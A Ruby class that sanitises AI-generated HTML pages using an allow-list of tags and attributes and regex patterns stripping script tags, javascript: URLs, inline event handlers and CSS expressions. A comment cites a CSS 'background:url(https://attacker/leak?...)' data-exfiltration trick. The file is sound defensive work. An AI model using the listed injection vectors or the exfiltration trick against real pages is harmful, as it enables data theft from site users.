# frozen_string_literal: true

class Ai::PageSanitizer
  # Form input tags (input, button, select, textarea, form, option, label,
  # fieldset) are intentionally NOT allow-listed. AI-generated pages don't
  # need them and they enable credential phishing on a seller-controlled
  # custom domain — a hallucinated <form action="..."> with a password
  # field would be served under the seller's brand. Buy/checkout buttons
  # in templates render as <a data-gumroad-action="buy"> instead.
  ALLOWED_TAGS = %w[
    div span p h1 h2 h3 h4 h5 h6 a img ul ol li
    section header footer nav main article aside
    strong em b i u s br hr blockquote pre code
    table thead tbody tfoot tr th td
    figure figcaption
    svg path circle rect line polyline polygon
    details summary
  ].freeze

  HTML_ATTRIBUTES = %w[
    class id
    src href alt title target rel
    width height loading
    data-gumroad-ref data-gumroad-field data-gumroad-action
    aria-label aria-hidden role
  ].freeze

  SVG_ATTRIBUTES = %w[
    viewBox xmlns preserveAspectRatio
    d fill stroke stroke-width stroke-linecap stroke-linejoin fill-rule clip-rule
    cx cy r rx ry x y x1 y1 x2 y2 points transform
  ].freeze

  ALLOWED_ATTRIBUTES = (HTML_ATTRIBUTES + SVG_ATTRIBUTES).freeze

  # `on\w+=` is anchored to an attribute boundary (start-of-string or whitespace)
  # so legitimate `data-on*` attributes like `data-onload` survive the regex
  # sweep. The pattern still nukes inline event handlers (`onclick=`, `onload=`)
  # that the Rails sanitizer would otherwise have to remove on its own, and
  # gives us belt-and-suspenders against any handler shape the safelist hasn't
  # been audited for.
  DANGEROUS_PATTERNS = [
    /javascript:/i,
    /(?<![\w-])on\w+\s*=/i, # onclick, onload, etc. but not data-onload
    /<script/i,
    /<\/script/i,
    /expression\s*\(/i,  # CSS expression()
    /url\s*\(\s*['"]*javascript/i,
  ].freeze

  # `style` is intentionally NOT allow-listed. Inline styles can exfiltrate data
  # via `background:url(https://attacker/leak?...)` from any non-sandboxed render
  # context (admin previews, emails, etc.). The public viewer renders inside a
  # sandboxed iframe today, but defense-in-depth: AI-generated HTML should use
  # class-based styling (Tailwind utility classes), not inline `style`.
  def self.sanitize(html)
    return "" if html.blank?

    # First pass: strip dangerous patterns
    cleaned = html.dup
    DANGEROUS_PATTERNS.each { |pattern| cleaned.gsub!(pattern, "") }

    # Second pass: use Rails sanitizer
    sanitizer = Rails::HTML5::SafeListSanitizer.new
    sanitizer.sanitize(
      cleaned,
      tags: ALLOWED_TAGS,
      attributes: ALLOWED_ATTRIBUTES,
    )
  end
end
